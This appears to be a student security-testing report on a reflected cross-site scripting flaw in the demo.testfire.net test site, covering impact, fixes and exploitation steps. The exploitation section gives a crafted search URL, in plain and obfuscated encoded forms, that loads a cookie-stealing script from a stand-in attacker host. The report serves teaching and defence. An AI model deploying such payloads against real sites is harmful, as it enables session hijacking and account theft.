# Deliverable_Five_SecurityTesting

## Vulnerability 1: Cross Site Scripting (Reflected)
Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance.


It attacks confidentiality and integrity as unauthorized user can get password from users’ session to log in and then read and write data.


Interception, modification and fabrication can exploit this vulnerability. The attacker may gain access to users cookies, session IDs, passwords, private messages etc. They can read and access the content of a page for any attacked user and therefore all the informations displayed to the user. The attacker may also compromise the content shown to the user. 


If attacker didn’t get user’s username and password from the session, then it is passive as it is eavesdropping users’ activity. If attacker get user’s username and password from the session, then it is active as the attacker log in as a different user to read and write data.


Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site, and the company will lose its reputation. If attacker get password of administrator, then it will cause data loss and unauthorized access.


Steps for development team taken to fix this vulnerability:
(1) Perform input validation and consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. Guarantee that the pages in the Web site return user inputs only after validating them for any malicious code. 
(2) Convert all non-alphanumeric characters to HTML character entities before displaying the user input in search engines and forums.
(3) Use testing tools extensively during the design phase to eliminate such XSS holes in the application before it goes into use.


The URL of the website with the described vulnerability: http://demo.testfire.net/


Steps taken to exploit the vulnerability.
Attacker observes that http://demo.testfire.net/ website contains a reflected XSS vulnerability: User can input a search term in the search box and clicks the submit button and the url will be http://demo.testfire.net/search.aspx?txtSearch=***
The attacker crafts a URL to exploit the vulnerability by making the URL http://demo.testfire.net/search.aspx?txtSearch=searchitem<script%20src="http://mallorysevilsite.com/authstealer.js"></script> which will run the js file to grab users’ information. Then attacker encodes this URL to http://demo.testfire.net/search.aspx?txtSearch=searchitem%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E, so that user cannot immediately decipher the malicious URL.
Attacker sends the link to some unsuspecting members of this website. When user clicks on the link, it goes to the website to search, right in the middle, the script tag runs (it is invisible on the screen) and loads and runs authstealer.js (triggering the XSS attack). 
The authstealer.js program runs in user's browser, and it grabs a copy of user's Authorization Cookie and sends it to attacker's server, where attacker retrieves it.
Attacker now puts user’'s Authorization Cookie into his browser as if it were his own to log in as another user and then read and write the user’s data. Condition will be worse if attacker get administrator’s password.


A screenshot (if applicable) of the vulnerability. (The screenshot follows the steps of what OWASP ZAP does)

![v1xss1](https://cloud.githubusercontent.com/assets/16599342/20375511/973a8fb2-ac4d-11e6-804d-25dbacad5fba.png)
![v1xss2](https://cloud.githubusercontent.com/assets/16599342/20375510/973a4750-ac4d-11e6-9f00-a4c139b21b69.png)

